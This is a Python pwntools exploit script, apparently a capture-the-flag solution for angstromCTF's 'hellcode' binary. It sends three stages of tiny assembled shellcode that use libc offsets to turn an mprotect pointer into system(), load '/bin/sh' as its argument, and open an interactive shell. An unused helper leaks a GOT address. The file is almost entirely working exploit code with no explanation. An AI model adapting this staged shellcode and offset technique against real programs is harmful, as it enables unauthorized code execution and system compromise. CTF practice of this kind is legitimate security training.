from pwn import *
import time
import sys
def hellcode(DEBUG):
	code_runner = 0x400996
	offset_mprotect = 0x0000000000101770
	offset_system = 0x0000000000045390
	offset_str_bin_sh = 0x18cd57
	
	if DEBUG=="1":
		t = 0.005
		r = process("./hellcode")
		raw_input("debug?")
	elif DEBUG=="2":
		s = ssh(host='shell.angstromctf.com', user='teamXXXX', password='XXXXX')
		r = s.process('/problems/hellcode/hellcode')
	
	def a(s):
		return asm(s, arch = "amd64", os = 'linux')
	
	def stage1():
		# save r14 = mprotect+7
		# r15 = code_runner
		# return code_runner
		log.info('stage 1')
		r.recvuntil("Please enter your code: ")
		payload = a('pop rbx')
		payload += a('sub bx, %d' % (0x400B47 - code_runner)) # 0x400996 (code_runner)
		payload += a('push rcx')
		payload += a('pop r14') # r14 = mprotect+7
		payload += a('push rbx')
		payload += a('push rbx')
		payload += a('pop r15') # r15 = 0x400996 (code_runner)
		payload += "\x90"*(0x10-len(payload))
		r.send(payload)
		
	def stage2():
		# change r14 from mprotect+7 to system
		# r13 = system
		# return code_runner
		log.info('stage 2')
		r.recvuntil("Please enter your code: ")
		payload = a('pop rax') # trash
		payload += a('push r15') # code_runner
		payload += a('sub r14, %d' % (offset_mprotect+7 - offset_system)) # r14 = system
		payload += a('push r14')
		payload += a('pop r13') # r13 = system
		payload += "\x90"*(0x10-len(payload))
		r.send(payload)
	
	def stage3():
		# change r13 to /bin/sh
		# return system (r14)
		log.info('stage 3')
		r.recvuntil("Please enter your code: ")
		payload = ''
		payload += a('add r13, %d' % (offset_str_bin_sh - offset_system)) # r13 = /bin/sh
		payload += a('push r13')
		payload += a('pop rdi') # rdi = /bin/sh
		payload += a('push r14') # system
		payload += "\x90"*(0x10-len(payload))
		r.send(payload)
	
	def leak():		
		puts_plt = 0x4007A0
		libc_start_main_got = 0x602048
		r.recvuntil("Please enter your code: ")
		payload = a('pop rbx')
		payload += a('sub bx, 0xd9')
		payload += a('push rbx')
		payload += a('mov rdi, 0x602048')
		payload += "\x90"*(0x10-len(payload))
		r.send(payload)
		res = r.recv(6)
		print hex(u64(res.ljust(8,"\x00"))) # same local
		
		
	stage1()
	stage2()
	stage3()
	# leak()
	
	r.interactive()

hellcode(sys.argv[1])
